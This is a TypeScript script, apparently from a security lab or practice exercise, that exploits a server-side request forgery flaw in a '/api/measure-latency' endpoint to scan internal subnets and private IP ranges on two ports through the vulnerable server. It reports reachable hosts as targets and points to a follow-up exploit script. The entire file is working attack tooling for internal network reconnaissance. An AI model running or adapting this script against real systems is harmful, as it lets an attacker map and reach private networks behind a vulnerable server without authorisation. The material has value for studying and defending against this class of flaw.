
import axios from 'axios';

// Default to local dev server if not provided
const BASE_URL = process.env.TARGET_URL || 'http://localhost:3000/api/measure-latency';
const SUBNETS = process.env.SUBNETS ? process.env.SUBNETS.split(',') : ['10.0.1', '10.0.0', '192.168.1', '172.16.0', '127.0.0'];
const PORTS = [4000, 6000]; // Focus on the Vulnerable App Port and PRPC

async function scanTarget(ip: string, port: number) {
    const targetUrl = `http://${ip}:${port}/server-ip`; // Hit a lightweight endpoint
    try {
        const response = await axios.get(BASE_URL, {
            params: { target: targetUrl },
            timeout: 1500 // Fast timeout
        });

        if (response.data.latency !== null) {
            console.log(`[+] TARGET FOUND: ${ip}:${port} (Latency: ${response.data.latency}ms)`);
            return { ip, port, latency: response.data.latency };
        }
    } catch (e) {
        // Silent fail
    }
    return null;
}

async function main() {
    console.log(`[*] Starting Hunter on ${BASE_URL}`);
    console.log(`[*] Target Subnets: ${SUBNETS.join(', ')}`);
    console.log(`[*] Target Ports: ${PORTS.join(', ')}`);
    console.log('------------------------------------------------');

    const found = [];

    // Parallel limiting
    const BATCH_SIZE = 50;

    for (const subnet of SUBNETS) {
        process.stdout.write(`Scanning ${subnet}.x ... `);
        const promises = [];
        for (let i = 1; i < 255; i++) {
            const ip = `${subnet}.${i}`;
            for (const port of PORTS) {
                promises.push(scanTarget(ip, port));
            }
            if (promises.length >= BATCH_SIZE) {
                const results = await Promise.all(promises);
                found.push(...results.filter(r => r !== null));
                promises.length = 0;
            }
        }
        if (promises.length > 0) {
            const results = await Promise.all(promises);
            found.push(...results.filter(r => r !== null));
        }
        process.stdout.write('Done.\n');
    }

    console.log('------------------------------------------------');
    console.log(`[*] Scan Complete. Found ${found.length} potential targets.`);
    if (found.length > 0) {
        console.log(JSON.stringify(found, null, 2));
        console.log(`\n[!] Save these IPs. Run 'scripts/exploit-nodes.ts' to identify them.`);
    }
}

main();
